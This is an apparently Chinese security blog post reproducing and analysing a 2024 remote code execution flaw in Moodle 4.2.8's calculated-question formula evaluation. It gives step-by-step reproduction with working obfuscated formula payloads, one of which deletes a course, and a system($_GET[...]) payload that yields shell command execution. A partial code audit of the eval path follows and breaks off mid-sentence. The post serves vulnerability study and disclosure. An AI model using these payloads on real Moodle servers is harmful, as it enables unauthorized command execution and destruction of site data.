---
title: moodleRCE 独特的bypass思路
url: https://mp.weixin.qq.com/s/hJb_D_r1s1oQwJG0uJOc9Q
source: Doonsec's feed
date: 2026-01-10
fetch_date: 2026-01-11T03:40:24.268598
---

# moodleRCE 独特的bypass思路

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h2gWTkTnwxt3v4RcBAHvcbHPzuiahhgwnwJCjkMFaAkbdwibIuInnytfw/0?wx_fmt=jpeg)

# moodleRCE 独特的bypass思路

原创

ZAC安全

ZAC安全

![]()

在小说阅读器中沉浸阅读

moodleRCE 独特的bypass思路

ZAC安全

#2025#

////前言

这个洞是24年爆出来的，当时也发了文章，但是当时比较因为敏感文章被删了。现在刚好过了一年多，补个档把过程和细节重新整理一遍。

RCE的利用手法比较有趣，遂简单分析一手

原漏洞作者分析：

https://blog.redteam-pentesting.de/2024/moodle-rce/

1

**01**

漏洞复现

官网下载moodle4.2.8版本

https://git.moodle.org/gw?p=moodle.git;a=snapshot;h=2d41ac46f45d49872db03db14ea3cfda1152c62c;sf=tgz

访问主页安装

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hvgWoPo5rNNa4yNHqFSTWJA3huiaNNibgxORglQ7YkvQNTkgNEsNACGIg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hgYTh4QntcIiaxwnWHRia2ydVDTluWoodYucLjpCWe6dU4SQMEUAEoCxg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hjKLeuuriaFM0AS3g84zILiaz4RSV1MVF0FWSgmWiaibATuSfks68BiaCQqg/640?wx_fmt=png&from=appmsg)

一路默认即可，看到下面的页面就说明安装成功了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hu9u7TkpPb6OkD7Z6LXtgZkgSAjNmSCZlVJVCzGMicNEHHzc1PusszzQ/640?wx_fmt=png&from=appmsg)

正式开始漏洞复现：

Home->Available courses-> Add a new course 进行添加一个课程

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hMeczmwPfRR2iaiavZ9oecut2Y5NBvdRaSBTSniaicQ0gWJnvvl3gzl5yOg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h0nvV4ZQGdlTJNH8LneSRoicYgWw3Ygf6bibm8ko6yFP2KP9IH3Qssgpw/640?wx_fmt=png&from=appmsg)

将页面往下拉，找到Course format

将topics format 改成single activity format（在moodle框架中topics format相当于是一个主题论坛的课程，而我们复现需要用到测验题，所以需要更改课程类型）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hSO68Vc4XJh7ljBzgTvhyq6WoibqonuNJibkG3Qm6pNZribPKVs2NbdrKA/640?wx_fmt=png&from=appmsg)

然后将type of activity改成quiz类型

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hwwgcWODQ0xDSib8yQQhb86NLSV8CEkQlNAFZ0vd0jeAMKqM6LAlicgWA/640?wx_fmt=png&from=appmsg)

Save即可看到课程生成完成

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hibYjkDx2IZxzNWKk4XN3fjIgpdokaLcjib5v1RAxs5UdG9iclqGj9XHSA/640?wx_fmt=png&from=appmsg)

点击class1，写个Name即可，剩下的按默认格式

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h7kPaLLa3CMjgXKAJuVG7rvX7AibHialh5lhSWmA08uHzpibgZB3213q5A/640?wx_fmt=png&from=appmsg)

Class1->Activity->Add question->Add->a new question

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hOFwTv7wiazpad6GMHF1ib0It69vgicka61E1q9vcH1icUP41pF4Xu7rQcw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h6KaibsuKWMtIA2Upu15sNLjBo8dmvt63PlFo2EfGdHGMBQAIjZpyyHw/640?wx_fmt=png&from=appmsg)

我们选择Calculated

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hteXhmFJiazxYdHFQxFSdLyBFa7pV0UrHkJhKW2x6ibXuoqib02mVtC7pQ/640?wx_fmt=png&from=appmsg)

然后我们新建一个问题，其中的question test是我们的问题，这套系统中的{}是用来括变量的，中间的a相当于通配符

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hjuVJKJMKTxWaqu4b7xXCKIXw7xUnx4vcb3137KSFWP28ko5tI2LX2Q/640?wx_fmt=png&from=appmsg)

答案设置成a ，grade是百分百 进行保存

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hNIWBn2XIG5z3ibTpyGuhLNPbmc7YHVEugOMAhgsIjaIMPqLPrADiavvQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hLXmIfNjP8jATZMjtInTHMn5X7XVL2raMJkKwUI6yjp9I3Q6e5hNrJg/640?wx_fmt=png&from=appmsg)

这三个空写上我们想删除的课程id，第一次默认创建的课程id都是2，后续创建的课程id依次递增

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hfBS64mEVxfbyXH0eSkdIKcwZ53WcicLDI924uyicKZlWVxyUViczTsEzg/640?wx_fmt=png&from=appmsg)

点击add

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h7ThHlO9e3Du7E1rY6a5ZjcqkW6zZWWa2L3v3LBgn9h1mBtd9vicp4Aw/640?wx_fmt=png&from=appmsg)

然后就可以save了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hGXkS8Q2hHp4DerIqJhHTwOZG7ZZDOtF0WQkGRDjict7qCOEuaiaFyayQ/640?wx_fmt=png&from=appmsg)

跳转回来，我们在点击test1，进行二次编辑

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hGT7YZs0pCibeOLNkZ6YU5ibOianicIicepdz8PA9Objoicg2x3Gws4XeM7uA/640?wx_fmt=png&from=appmsg)

将答案改成

((acos(2) . 0+acos(2) . 0+acos(2) . 0+acos(2) . 0+acos(2)) ^ (8 . 4 . 2 . 8 . 8 . 3 . 4 . 0 . 0 . 0 . -1 . 3) ^ (2 . 0 . 0 . 3 . 0 . 0 . 0 . 0 . 0 . -8 . 1 . 0) ^ (0 . 0 . 0 . 0 . 0 . 0 . -2 . 1 . 4 . 6 . 0 . 0) ^ (0 . 0 . 0 . 0 . -8 . 8 . 0 . 0 . 2 . 0 . -8)){a}

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hdhhOVXxbkDxDUj4vM5MHgy5W9n01ejPvicRIl5fxuEicia0GlocicauFwQ/640?wx_fmt=png&from=appmsg)

然后保存，会发现有个报错，不用管，忽略即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h8pHCgI46cu2VCPsLUsul08kLh6D6VgoZHfUfonmKy03AwxxfoURX7g/640?wx_fmt=png&from=appmsg)

回到主页，点击class1->preview quiz

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h3H4gyKoJibMcNEF3yM8E0watOnfvrOZGtgiaujQ9hUnbBXCdhib69bcUg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hYGO4PxxDJgIjYkafE2uP9Zz8BwKOPTcZYyf2yc8picVPLloNlBTlLZg/640?wx_fmt=png&from=appmsg)

发现课程已经被删除

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hckZKVmtMCRSB2Jiax1QZMActFPk9oBHSrzCGbfz7XPAicncOrk4TYmNQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hg0CQxnZAPN25WVaKs2miaRXtN7NPnkdOMxb3TlPblXrkt8dEmatSg9w/640?wx_fmt=png&from=appmsg)

而执行简单命令的方式与上面几乎相同，用作者给的脚本跑一下payload

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hicUYg2JiaR8ukFeKInQya8nQ2KvbeAXSMsGRCuoT7bNa381Fu0iaWeFKw/640?wx_fmt=png&from=appmsg)

((acos(2) . 0+acos(2) . 0+acos(2)) ^ (2 . 1 . 1 . 0 . 0 . 0 . 0) ^ (1 . 0 . 0 . 0 . 0 . 0 . 0) ^ (0 . 0 . -4 . 8 . 8 . 1) ^ (-8 . 2 . 3 . 7 . 0 . 0)){a}

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hlXjUIc1xLbaUbEOSGjOJXqO7QddicDJuOJZG9GbQwAfoibDiaxs5A7Z4g/640?wx_fmt=png&from=appmsg)

该方式只能使用phpinfo，DELETE\_COURSE这种单参数的函数，利用受限

进阶方式如下，question text中设置为{b}

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h1ibsNHCAJfOLNZViaf3x7ZTnkuzH07UFW3jPKNGQhgajHoCEUp2sxwhg/640?wx_fmt=png&from=appmsg)

打入payload

(1)->{system($\_GET[chr(97)])}

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hvd7iaLy6Prm2K5FwZbPESKiaS0PGUIdDNZYrvxIlM6C1RrribfBUutPkw/640?wx_fmt=png&from=appmsg)

保存进行下一步，f12，将所有payload变量设置为0

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hRfl7a4qT2icxxXM9icADicVIhR8Zjqr13dLMXMJEcQAvibsrKE3nlCYd4w/640?wx_fmt=png&from=appmsg)

点击next pages，会发现报错Exception - system(): Argument #1 ($command) cannot be empty

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h7CuDOlkYKEPM8TAtMD6Jvic4WeMwnQLOusj9etxBCTUwNptf4HXIDtw/640?wx_fmt=png&from=appmsg)

我们直接url打入命令即可成功完成RCE

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hCkCcNnUMaA8bzkBespGTTT8xibTcrne4rbGqbQoR8dtSdApF9757gZg/640?wx_fmt=png&from=appmsg)

2

**01**

代码审计

原作者给的验证脚本是substitute\_variables\_and\_eval

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hzs4J06BBFgFV0qSqxZVDq2OOOsx0tNuxZscnMurWDgdopuXdnrfnpw/640?wx_fmt=png&from=appmsg)

在源码中找到该函数进行跟踪分析，我们可以看到字符串过了一个substitute\_variables和qtype\_calculated\_find\_formula\_errors两个部分就直接拼进eval了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hrz8PtdVSUQQOmkGJ9rgbmYEibDv5HuiawQjFJdxZBebl2RNh7GbbqGzA/640?wx_fmt=png&from=appmsg)

而该函数调用的位置也比较明显，在calculate函数中，而在经过这几个函数过滤后直接放进了calculate\_raw中的eval函数中

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h3DSMCruf7K6icHpO5Ket6CI6deEP30WR7xc1YhgNia0Wfj6fdWUs5U4A/640?wx_fmt=png&from=appmsg)

那么我们一起来分析下这些过滤语句都是什么，先进入qtype\_calculated\_find\_formula\_errors

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9ho0zpvfsdTRf9Q8niblpBC...